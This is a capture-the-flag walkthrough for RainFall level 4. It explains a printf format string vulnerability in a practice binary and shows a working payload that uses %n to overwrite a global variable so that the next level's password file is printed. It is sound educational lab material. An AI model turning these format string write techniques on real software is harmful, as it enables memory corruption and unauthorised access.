# Level4 Walkthrough


## Overview
- `level4/source.c` reads up to `0x200` bytes from stdin into a local 520-byte buffer.
- It then calls `printf(local_20c)` directly, so user input is treated as a format string.
- The program checks the global variable `m` and runs `/bin/cat /home/user/level5/.pass` when the value matches.

## Vulnerability
- This is a classic format string vulnerability.
- Input can include `%n`, which writes the number of bytes printed so far to an address supplied on the stack.
- We can overwrite global `m` by placing its address in the payload and using `%n`.

## Target
- Address of `m`: `0x08049810`
- Desired value for `m`: `0x1025544` (decimal `16930116`)

## Exploit
- Put `0x08049810` in little-endian form at the start of the payload.
- Print enough characters so the total count reaches `16930116`.
- Use `%12$n` to write that total count into `m`.

Example payload:

```python
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")' > /tmp/out

level4@RainFall:~$ (cat /tmp/out; cat) | ./level4

```

## Explanation
- The first 4 bytes are the address of `m` and count toward the printed total.
- `%16930112d` prints enough padding to reach `16930116` total bytes.
- `%12$n` writes the count into the address from the stack, which matches `m`.
-  AAAA|b7ff26b0|bffff784|b7fd0ff4|0|0|bffff748|804848d|bffff540|200|b7fd1ac0|b7ff37d0|41414141| n = 12
   all fields are %x
## Result
- `m` becomes `0x1025544`.
- The program executes:

```sh
/bin/cat /home/user/level5/.pass
```

## Relation to Level3
- Both levels use the same underlying flaw: `printf(user_input)`.
- Level3 required `m == 0x40`; level4 requires `m == 0x1025544`.
- The exploit structure is the same: address + padding + `%n`.
  
